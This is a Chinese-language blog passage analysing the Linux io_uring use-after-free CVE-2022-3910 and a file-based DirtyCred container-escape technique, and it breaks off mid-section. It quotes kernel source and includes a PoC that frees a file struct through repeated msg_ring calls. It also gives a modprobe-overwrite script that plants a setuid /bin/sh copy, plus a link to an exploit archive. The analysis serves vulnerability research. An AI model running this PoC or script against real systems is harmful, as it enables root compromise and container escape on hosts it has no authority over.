<!DOCTYPE html><html lang="en" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon_io/apple-touch-icon.png"><link rel="icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://mundi-xu.github.io/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"><meta name="theme-color" content="#2f4154"><meta name="author" content="煊宇"><meta name="keywords" content="LLM Security"><meta property="article:published_time" content="2023-08-02T16:05:21.000Z"><meta property="article:modified_time" content="2023-11-26T13:05:21.000Z"><meta property="article:section" content="Security Research"><meta property="article:tag" content="System Security"><meta property="article:tag" content="linux"><meta property="article:tag" content="DirtyCred"><meta property="article:tag" content="Kernel"><meta property="article:tag" content="CVE"><meta property="article:tag" content="Container Escape"><meta name="google-site-verification" content="8weHOmi2lqvnOxDE30WJFT51umo63nyCgfm8dXHNT5g"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><link rel="dns-prefetch" href="//at.alicdn.com"><link rel="dns-prefetch" href="//cdnjs.cloudflare.com"><link rel="dns-prefetch" href="//raw.githubusercontent.com"><link rel="dns-prefetch" href="//busuanzi.ibruce.info"><link rel="preconnect" href="https://at.alicdn.com" crossorigin><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin><link rel="preconnect" href="https://busuanzi.ibruce.info" crossorigin><link rel="dns-prefetch" href="//www.googletagmanager.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin><link rel="preload" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css" as="style" onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css"></noscript><link rel="preload" href="/css/main.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/events.js" as="script"><link rel="preload" href="/js/plugins.js" as="script"><link rel="preload" href="/js/boot.js" as="script"><link rel="preload" href="/js/img-lazyload.js" as="script"><meta name="description" content="详细探讨Linux内核中CVE-2022-3910漏洞及DirtyCred技术，分析其在提权和容器逃逸场景中的具体应用与攻击原理。"><meta property="og:type" content="article"><meta property="og:title" content="CVE-2022-3901：利用DirtyCred进行容器逃逸"><meta property="og:url" content="https://mundi-xu.github.io/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/index.html"><meta property="og:site_name" content="Hanyin&#39;s Space"><meta property="og:description" content="详细探讨Linux内核中CVE-2022-3910漏洞及DirtyCred技术，分析其在提权和容器逃逸场景中的具体应用与攻击原理。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_001.png"><meta property="og:image" content="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_003.png"><meta property="article:published_time" content="2023-08-02T16:05:21.000Z"><meta property="article:modified_time" content="2023-11-26T13:05:21.000Z"><meta property="article:author" content="煊宇"><meta property="article:tag" content="System Security"><meta property="article:tag" content="linux"><meta property="article:tag" content="DirtyCred"><meta property="article:tag" content="Kernel"><meta property="article:tag" content="CVE"><meta property="article:tag" content="Container Escape"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_001.png"><meta name="format-detection" content="telephone=no"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hanyin&#39;s Space"><meta name="referrer" content="no-referrer-when-downgrade"><meta name="renderer" content="webkit"><meta http-equiv="X-UA-Compatible" content="IE=edge"><link rel="apple-touch-icon" sizes="180x180" href="/img/favicon_io/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/img/favicon_io/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/img/favicon_io/favicon-16x16.png"><link rel="manifest" href="/img/favicon_io/site.webmanifest"><script type="application/ld+json">{
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "CVE-2022-3901：利用DirtyCred进行容器逃逸",
    "author": {
      "@type": "Person",
      "name": "煊宇"
    },
    "datePublished": "2023-08-02T16:05:21.000Z",
    
    "dateModified": "2023-11-26T13:05:21.000Z",
    
    "description": "详细探讨Linux内核中CVE-2022-3910漏洞及DirtyCred技术，分析其在提权和容器逃逸场景中的具体应用与攻击原理。",
    
    "publisher": {
      "@type": "Organization",
      "name": "Hanyin&#39;s Space",
      
      "logo": {
        "@type": "ImageObject",
        "url": "/img/favicon_io/favicon.ico"
      }
      
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://mundi-xu.github.io/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/index.html"
    },
    
    "keywords": "System Security,linux,DirtyCred,Kernel,CVE,Container Escape",
    
    
    "articleBody": "CVE-2022-3910是一个io_uring上的UAF，可以通过DirtyCred很方便的提权，但我们需要覆盖/proc/sys/kernel/modprobe来尝试容器逃逸。 文中代码片段来自Linux kernel v6.0-rc5 io_uring相关组件介绍 io_uring 子系统由Jens Axboe创建，用于提高 I/O 操作（文件读/写、socket发送/接收）的性能。一般来说此类需要与内核交互的 I/O 操作会使用系统调用 (syscall) ，但因为需要在用户态和内核态之间进行上下文切换，会产生大量开销，可能会对执行大量此类 I/O 操作的程序（例如 Web 服务器）产生很大的性能损失。目前计划将其集成到 NGINX Unit 中。io_uring 由内核子系统（主要位于fs/io_uring.c）和用户态库（liburing）组成。 io_uring 不会对每个请求使用系统调用，而是通过提交队列 (SQ) 和完成队列 (CQ)两个环形缓冲区实现用户和内核态之间的通信。用户态程序将 I/O 请求放在 SQ 上，内核将它们拿出来并处理，完成的请求放在 CQ 上，同"
    
  }</script><title>CVE-2022-3901：利用DirtyCred进行容器逃逸 - Hanyin&#39;s Space</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/3.0.0/hint.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var dntVal,CONFIG={hostname:"mundi-xu.github.io",root:"/",version:"1.9.8",typing:{enable:!0,typeSpeed:80,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!0,offset_factor:3},web_analytics:{enable:!0,follow_dnt:!1,google:{measurement_id:"G-3847WCVNF2"}},search_path:"/local-search.json",include_content_in_search:!0};CONFIG.web_analytics.follow_dnt&&(dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on")))</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>Fluid.ctx.dnt||Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-3847WCVNF2",function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","G-3847WCVNF2")})</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Hanyin's Space" type="application/atom+xml"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>Hanyin&#39;s Space</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/" target="_self"><i class="iconfont icon-home-fill"></i> <span>Home</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/" target="_self"><i class="iconfont icon-archive-fill"></i> <span>Archives</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/" target="_self"><i class="iconfont icon-category-fill"></i> <span>Categories</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/" target="_self"><i class="iconfont icon-tags-fill"></i> <span>Tags</span></a></li><li class="nav-item"><a class="nav-link" href="/about/" target="_self"><i class="iconfont icon-user-fill"></i> <span>About</span></a></li><li class="nav-item"><a class="nav-link" href="/links/" target="_self"><i class="iconfont icon-link-fill"></i> <span>Links</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" rel="external nofollow noreferrer" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" rel="external nofollow noreferrer" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/banner.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="CVE-2022-3901：利用DirtyCred进行容器逃逸"></span></div><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2023-08-03 00:05" pubdate>August 3, 2023 am</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 9.2k words </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 77 mins </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> views</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar category-bar" style="margin-right:-1rem"><div class="category-list"><div class="category row nomargin-x"><a class="category-item list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Security Research" id="heading-ef1cd54fe461bafc9bc1f6892b96d498" role="tab" data-toggle="collapse" href="#collapse-ef1cd54fe461bafc9bc1f6892b96d498" aria-expanded="true">Security Research <span class="list-group-count">(11)</span> <i class="iconfont icon-arrowright"></i></a><div class="category-collapse collapse show" id="collapse-ef1cd54fe461bafc9bc1f6892b96d498" role="tabpanel" aria-labelledby="heading-ef1cd54fe461bafc9bc1f6892b96d498"><div class="category-post-list"><a href="/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/" title="CVE-2022-3901：利用DirtyCred进行容器逃逸" class="list-group-item list-group-item-action active"><span class="category-post">CVE-2022-3901：利用DirtyCred进行容器逃逸</span> </a><a href="/2022/10/08/DirtyCred/" title="DirtyCred与CVE-2021-4154漏洞分析" class="list-group-item list-group-item-action"><span class="category-post">DirtyCred与CVE-2021-4154漏洞分析</span> </a><a href="/2021/11/30/Architectural-Support-for-System-Security/" title="Architectural Support for System Security" class="list-group-item list-group-item-action"><span class="category-post">Architectural Support for System Security</span> </a><a href="/2021/11/29/why-ml-fails-security/" title="【转载】为什么机器学习解决网络安全问题总是失败" class="list-group-item list-group-item-action"><span class="category-post">【转载】为什么机器学习解决网络安全问题总是失败</span> </a><a href="/2021/11/26/Common-vulnerabilities-mitigation-measures/" title="常见漏洞缓解措施" class="list-group-item list-group-item-action"><span class="category-post">常见漏洞缓解措施</span> </a><a href="/2021/07/15/Chromium-component-risk-analysis/" title="【转载】攻防启示：Chromium 组件风险剖析与收敛" class="list-group-item list-group-item-action"><span class="category-post">【转载】攻防启示：Chromium 组件风险剖析与收敛</span> </a><a href="/2021/02/23/recent-technology-of-symbolic-execution/" title="【转载】带你搞懂符号执行的前世今生与最近技术" class="list-group-item list-group-item-action"><span class="category-post">【转载】带你搞懂符号执行的前世今生与最近技术</span> </a><a href="/2021/01/01/A-brief-analysis-of-PayBreak-anti-ransomware-system/" title="PayBreak防勒索系统简析" class="list-group-item list-group-item-action"><span class="category-post">PayBreak防勒索系统简析</span> </a><a href="/2020/12/28/Research-on-Ransomware-Structure-and-Encryption-Mode/" title="勒索软件结构与加密模式研究" class="list-group-item list-group-item-action"><span class="category-post">勒索软件结构与加密模式研究</span> </a><a href="/2020/12/27/A-Brief-Analysis-of-Cryptographic-Algorithm-RUST/" title="密码学初探-基于RUST的密码系统与算法简析" class="list-group-item list-group-item-action"><span class="category-post">密码学初探-基于RUST的密码系统与算法简析</span> </a><a href="/2020/07/01/Blockchain-based-security-log-system/" title="基于区块链的安全日志系统" class="list-group-item list-group-item-action"><span class="category-post">基于区块链的安全日志系统</span></a></div></div></div></div></aside></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">CVE-2022-3901：利用DirtyCred进行容器逃逸</h1><p id="updated-time" class="note note-primary" style="display:none">Last updated on 2023-11-26T21:05:21+08:00</p><div class="markdown-body"><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-3910">CVE-2022-3910</a>是一个io_uring上的UAF，可以通过DirtyCred很方便的提权，但我们需要覆盖<code>/proc/sys/kernel/modprobe</code>来尝试容器逃逸。</p><p>文中代码片段来自Linux kernel v6.0-rc5</p><h1 id="io_uring相关组件介绍">io_uring相关组件介绍</h1><p>io_uring 子系统由<a target="_blank" rel="noopener external nofollow noreferrer" href="https://twitter.com/axboe">Jens Axboe</a>创建，用于提高 I/O 操作（文件读/写、socket发送/接收）的性能。一般来说此类需要与内核交互的 I/O 操作会使用系统调用 (syscall) ，但因为需要在用户态和内核态之间进行上下文切换，会产生大量开销，可能会对执行大量此类 I/O 操作的程序（例如 Web 服务器）产生很大的性能损失。目前<a target="_blank" rel="noopener" href="https://github.com/nginx/unit/issues/511">计划</a>将其集成到 NGINX Unit 中。io_uring 由内核子系统（主要位于<code>fs/io_uring.c</code>）和用户态库（<a target="_blank" rel="noopener" href="https://github.com/axboe/liburing">liburing</a>）组成。</p><p>io_uring 不会对每个请求使用系统调用，而是通过提交队列 (SQ) 和完成队列 (CQ)两个环形缓冲区实现用户和内核态之间的通信。用户态程序将 I/O 请求放在 SQ 上，内核将它们拿出来并处理，完成的请求放在 CQ 上，同时允许用户态程序查看处理的结果。</p><p>SQ和CQ操作是异步的：向SQ添加请求永远不会阻塞，除非队列已满。</p><p>io_uring 可以配置为轮询SQ 是否有新请求，或者使用系统调用<code>io_uring_enter</code>来通知内核存在新请求。然后内核可以在当前线程中处理该请求，或者将其委托给其他内核工作线程。</p><p><a target="_blank" rel="noopener" href="https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf">Jens Axboe 的幻灯片中</a>介绍了漏洞相关的两个重要组件。</p><h2 id="fixed-files">Fixed files</h2><p>Fixed files, or direct descriptors, <a target="_blank" rel="noopener" href="https://lwn.net/Articles/863071/">可以被看作 io_uring 特定的文件描述符</a>.io_uring 会维护所有已注册文件的引用来减少操作文件描述符导致的额外开销，只有当fixed files未注册或 io_uring 实例被关闭之后才会释放此引用。</p><h2 id="ring-messages">Ring messages</h2><p>io_uring 支持环之间的消息传递<code>io_uring_prep_msg_ring()</code>。根据<a target="_blank" rel="noopener" href="https://man.archlinux.org/man/extra/liburing/io_uring_prep_msg_ring.3.en">文档</a>所述，此操作会在目标环中创建一个 CQE，并将其<code>res</code>和<code>user_data</code>设置为用户指定的值。</p><p><a target="_blank" rel="noopener" href="https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages">如此处</a>所述，此功能可用于唤醒在环上等待的休眠任务，或者只是传递任意信息。</p><h1 id="cve-2022-3910">CVE-2022-3910</h1><p>CVE-2022-3910 是因为<code>io_msg_ring()</code>函数不正确的更新引用计数。源文件在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/io_uring/msg_ring.c">这里</a>，相关代码片段如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_msg_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_kiocb *req, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> issue_flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_msg</span> *<span class="hljs-title">msg</span> =</span> io_kiocb_to_cmd(req, <span class="hljs-keyword">struct</span> io_msg);<br>	<span class="hljs-type">int</span> ret;<br><br>	ret = -EBADFD;<br>	<span class="hljs-keyword">if</span> (!io_is_uring_fops(req-&gt;file))<br>		<span class="hljs-keyword">goto</span> done;<br><br>	<span class="hljs-keyword">switch</span> (msg-&gt;cmd) &#123;<br>	<span class="hljs-keyword">case</span> IORING_MSG_DATA:<br>		ret = io_msg_ring_data(req);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> IORING_MSG_SEND_FD:<br>		ret = io_msg_send_fd(req, issue_flags);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">default</span>:<br>		ret = -EINVAL;<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br><br>done:<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		req_set_fail(req);<br>	io_req_set_res(req, ret, <span class="hljs-number">0</span>);<br>	<span class="hljs-comment">/* put file to avoid an attempt to IOPOLL the req */</span><br>	io_put_file(req-&gt;file);<br>	req-&gt;file = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">return</span> IOU_OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/fc7222c3a9f56271fba02aabbfbae999042f1679">patch</a>中找可以了解详细的问题原因。</p><p><img lazyload src="/img/loading.gif" data-src="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_001.png"></p><p>通常io_uring 的消息传递功能需要与另一个 io_uring 实例对应的文件描述符。如果我们传入其他引用，就只会调用<code>io_put_file()</code>并返回错误。</p><p>如果我们传入一个Fixed files，<code>io_put_file()</code>仍然会被调用，导致引用数-1，但实际上我们没有获取对该文件的额外引用。</p><h2 id="漏洞影响">漏洞影响</h2><p><code>io_put_file()</code>是<code>fput()</code>的wrapper。在这里可以看到<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/file_table.c#L374">源码</a>，主要代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fput</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>	<span class="hljs-keyword">if</span> (atomic_long_dec_and_test(&amp;file-&gt;f_count)) &#123;<br>		<span class="hljs-comment">// free the file struct</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们只需要重复触发漏洞直到引用计数降至0就可以释放对应的<code>file</code>结构体，同时<code>io_uring</code>会继续保留对其的引用，从而达成​一个经典的<strong>UAF</strong>​。</p><p>poc如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">r</span>;</span><br>io_uring_queue_init(<span class="hljs-number">8</span>, &amp;r, <span class="hljs-number">0</span>);<br><span class="hljs-type">int</span> target = open(TARGET_PATH, O_RDWR | O_CREAT | O_TRUNC, <span class="hljs-number">0644</span>);<br><br><span class="hljs-comment">// Register target file as fixed file.</span><br><span class="hljs-keyword">if</span> (io_uring_register_files(&amp;r, &amp;target, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>	perror(<span class="hljs-string">&quot;[-] io_uring_register_files&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> * <span class="hljs-title">sqe</span>;</span><br><br><span class="hljs-comment">// Refcount is currently 2</span><br><span class="hljs-comment">// (Check by by setting a breakpoint in io_msg_ring())</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2</span>; i++) &#123;<br>	sqe = io_uring_get_sqe(&amp;r);<br>	io_uring_prep_msg_ring(sqe, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>	sqe-&gt;flags |= IOSQE_FIXED_FILE;<br>	io_uring_submit(&amp;r);<br>	io_uring_wait_cqe(&amp;r, &amp;cqe);<br>	io_uring_cqe_seen(&amp;r, cqe);<br>&#125;<br><br><span class="hljs-comment">// Refcount should now be 0, file struct should be freed.</span><br></code></pre></td></tr></table></figure><p>正常的利用方式可以通过跨缓存堆喷覆盖<code>sk_buff</code>的析构函数（不是<code>sk_buff-&gt;data</code>，因为它的最小分配太大了）以获得执行控制，exp如下： <a target="_blank" rel="noopener" href="https://starlabs.sg/blog/2023/07-container-escape-using-file-based-DirtyCred_old_source.zip">CVE-2022-3910.rar</a></p><h1 id="dirtycred">DirtyCred</h1><p>在我之前的一篇文章<a href="https://mundi-xu.github.io/2022/10/08/DirtyCred/">DirtyCred与CVE-2021-4154漏洞分析</a>中详细介绍了DirtyCred的原理和利用方式，其主要核心思想就是<strong>Attacking Open File Credentials</strong>.</p><h2 id="面临的困难">面临的困难</h2><p>一般来说，DirtyCred的利用方式是通过打开<code>/etc/passwd</code>来添加具有 root 权限的新用户，但我们这里准备尝试利用<a target="_blank" rel="noopener" href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique"><code>/sbin/modprobe</code></a>。</p><p>当我们尝试执行具有未知魔数（magic header）的文件时，内核将<strong>以root 权限从 root 命名空间</strong>调用全局内核变量<code>modprobe_path</code>指向的二进制文件（默认为<code>/sbin/modprobe</code>）。</p><p>所以我们只需要把<code>/sbin/modprobe</code>用以下 shell 脚本覆盖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">cp</span> /bin/sh /tmp/sh<br><span class="hljs-built_in">chmod</span> 4777 /tmp/sh<br></code></pre></td></tr></table></figure><p>当我们尝试执行具有无效魔数头的文件时，内核就会执行上述脚本，创建<code>/bin/sh</code> 来获取root shell。</p><p>但实际上这种利用方式在容器化的环境中无效，因为在容器的命名空间中无法直接访问<code>/sbin/modprobe</code>，<code>modprobe_path</code>会被定位到<code>/proc/sys/kernel/modprobe</code>。</p><h2 id="proc文件系统"><code>/proc</code>文件系统</h2><p>根据<a target="_blank" rel="noopener" href="https://docs.kernel.org/filesystems/proc.html">官网文档</a>的定义，<code>/proc</code>作为一个伪文件系统，负责充当内核中内部数据结构的接口，可用于获取有关系统的信息并在运行时更改某些内核参数（sysctl）。其中<code>/proc/sys</code>子目录允许我们通过写文件的方式一样修改各种内核参数的值。例如<code>/proc/sys/kernel/modprobe</code>会直接指向内核全局变量<code>modprobe_path</code>，修改该“文件”将对应地更改<code>modprobe_path</code>的值。</p><p>当然，如果我们<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/proc/proc_sysctl.c#L582">不是 root</a>，我们就没办法向<code>/proc/sys/*</code> 中写入任何内容。但这并不是一个大问题，我们可以利用传统的DirtyCred去写入<code>/etc/passwd</code>来实现本地权限提升。</p><p>需要注意的是这些对文件的操作需要特定的处理函数，其中<code>/proc/sys/*</code>与<code>file</code>结构体相关联的<code>f_op</code>会被设置为<code>proc_sys_file_operations</code>。但是inode加锁依赖于假设<code>ext4_buffered_write_iter()</code>可以成功写入目标文件，而对<code>/proc/sys/*</code>文件执行会导致未定义行为，返回错误代码。</p><p>而为了成功利用DirtyCred，我们必须在调用写入处理程序之前替换<code>file</code>结构体，这意味着有如下竞争窗口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>	<span class="hljs-type">ssize_t</span> ret;<br><br>	<span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))<br>		<span class="hljs-keyword">return</span> -EBADF;<br>	<span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	<span class="hljs-comment">// RACE WINDOW START</span><br>	<span class="hljs-keyword">if</span> (unlikely(!access_ok(buf, count)))<br>		<span class="hljs-keyword">return</span> -EFAULT;<br><br>	ret = rw_verify_area(WRITE, file, pos, count);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br>	<span class="hljs-keyword">if</span> (count &gt; MAX_RW_COUNT)<br>		count =  MAX_RW_COUNT;<br><br>	file_start_write(file);<br>	<span class="hljs-comment">// RACE WINDOW END</span><br>	<span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write)<br>		ret = file-&gt;f_op-&gt;write(file, buf, count, pos);<br>	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write_iter)<br>		ret = new_sync_write(file, buf, count, pos);<br>	<span class="hljs-keyword">else</span><br>		ret = -EINVAL;<br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>		fsnotify_modify(file);<br>		add_wchar(current, ret);<br>	&#125;<br>	inc_syscw(current);<br>	file_end_write(file);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出来窗口很小，我们需要想办法扩大窗口。</p><h2 id="a-new-target-aio_write">A new target: <code>aio_write()</code></h2><p><a target="_blank" rel="noopener" href="https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/">内核 AIO 子系统</a>（与 POSIX AIO 不同）是一个有点过时的异步 I/O 接口，有点像 io_uring 